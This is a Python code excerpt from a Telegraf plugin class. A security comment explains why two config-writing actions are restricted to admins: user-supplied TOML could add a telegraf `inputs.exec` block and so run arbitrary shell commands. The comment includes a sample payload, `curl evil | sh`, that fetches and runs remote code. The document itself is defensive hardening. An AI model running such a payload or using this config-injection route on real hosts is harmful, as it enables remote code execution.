...
class TelegrafPlugin:
    ...
    # Admin-only subset (found in a fresh security re-audit): set_managed_region
    # writes a caller-supplied string straight into telegraf's live config after
    # only a syntax check (valid TOML, not a policy check on its CONTENT) and then
    # reloads/restarts telegraf onto it. Telegraf's own `inputs.exec` input type
    # runs an arbitrary shell command from its config -- a body like
    # `[[inputs.exec]]\ncommands = ["curl evil | sh"]\n...` is valid TOML and
    # would have passed straight through to a route gated by JWT-any-authenticated-
    # user (get_current_user, no role check) before this. Any self-registered
    # "user"-role account could reach this before this fix -- registration has no
    # invite gate today (#1073, still open) -- an unauthenticated-adjacent RCE path
    # onto the host telegraf runs on (which itself has Docker-socket-proxy restart
    # access). Scoped to just these two (not `reload`): `reload` alone is a no-op
    # unless `force_restart=True`, and even then only restarts a container --
    # a nuisance, not arbitrary code execution.
    ADMIN_ONLY_ACTIONS = frozenset({"set_managed_region", "clear_managed_region"})
